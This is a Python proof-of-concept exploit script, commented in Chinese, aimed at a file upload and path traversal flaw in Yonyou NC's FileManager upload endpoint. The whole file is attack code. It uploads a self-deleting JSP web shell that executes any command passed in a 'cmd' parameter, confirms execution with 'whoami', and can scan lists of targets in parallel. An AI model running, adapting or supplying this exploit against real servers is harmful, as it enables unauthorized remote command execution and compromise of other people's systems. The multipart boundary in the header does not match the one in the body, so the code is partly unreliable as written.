import requests
import argparse
from multiprocessing import Pool
import urllib.parse

requests.packages.urllib3.disable_warnings()


def main():
    parser = argparse.ArgumentParser(description='用友 NC FileManager接口处存在文件上传漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input url!')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file!')
    args = parser.parse_args()
    pool = Pool(20)

    if args.url:
        target = format_url(args.url)
        check(target)
    elif args.file:
        targets = []
        try:
            with open(args.file, 'r') as f:
                for line in f.readlines():
                    line = line.strip()
                    target = format_url(line)
                    targets.append(target)
            pool.map(check, targets)
            pool.close()
            pool.join()  # 添加join，确保进程池任务执行完毕并正确释放资源
        except FileNotFoundError:
            print(f"文件 {args.file} 不存在，请检查路径是否正确")
        except PermissionError:
            print(f"没有权限打开文件 {args.file}")
        except Exception as e:
            print(f"读取文件出现其他异常: {e}")


def check(target):
    target = format_url(target)
    p_target = target
    jc_target = p_target + '/rce.jsp?cmd=whoami'
    target = target + '/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=--------ok4o88lom'
    }

    datas = """
    --d0b7a0d40eed0e32904c8017b09eb305
Content-Disposition: form-data; name="file"; filename="rce.jsp"
Content-Type: text/plain 

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--d0b7a0d40eed0e32904c8017b09eb305--
"""

    try:
        response = requests.post(url=target, headers=headers, data=datas, verify=False, timeout=5)
        response1 = requests.get(url=jc_target, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and response1.status_code == 200:
            print(f"[+]{p_target} is vulnerable!")
        else:
            print(f"[-]{p_target} is not vulnerable!")
    except requests.exceptions.Timeout:
        print(f"[-]{p_target} 超时")
    except requests.exceptions.RequestException as e:
        print(f"[-]{p_target}{target} 出现请求异常: {e}")


def format_url(url):
    # 去除 URL 首尾的空白字符
    url = url.strip()
    """格式化URL，补充协议头，添加路径，确保URL格式规范"""
    parsed_url = urllib.parse.urlparse(url)
    if not parsed_url.scheme:
        return 'http://' + url
    return url


if __name__ == '__main__':
    main()